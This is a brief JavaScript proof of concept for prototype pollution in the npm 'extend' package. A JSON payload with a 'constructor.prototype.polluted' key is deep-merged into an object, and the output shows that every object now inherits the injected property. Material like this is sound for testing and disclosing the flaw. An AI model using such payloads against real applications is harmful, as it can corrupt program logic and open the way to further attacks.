var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
let extend = require('extend');
let payload = JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}');
var obj = {};
console.log({}.polluted);
extend(true, obj, payload);
console.log({}.polluted);